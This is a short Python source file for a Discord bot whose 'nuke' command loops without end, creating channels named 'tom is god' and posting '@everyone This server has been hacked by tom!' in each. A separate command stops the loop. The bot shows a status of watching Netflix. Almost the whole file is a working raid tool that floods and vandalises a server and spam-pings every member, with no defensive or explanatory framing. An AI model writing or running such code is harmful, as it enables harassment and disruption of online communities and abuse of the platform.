import discord
from discord.ext import commands
import os
import asyncio

client = commands.Bot(command_prefix="?")
client.remove_command("help")

@client.event
async def on_ready():
    print("The bot is online!")
    activity = discord.Activity(type=discord.ActivityType.watching, name="Netflix")
    await client.change_presence(status=discord.Status.idle, activity=activity)

loop = True

@client.command()
async def nuke(ctx):
    global loop
    while loop == True:
        guild = ctx.guild
        channel = await guild.create_text_channel("tom is god")
        await channel.send("@everyone This server has been hacked by tom!")

@client.command()
async def stop(ctx):
    global loop
    loop = False

client.run(os.getenv("DISCORD_TOKEN"))
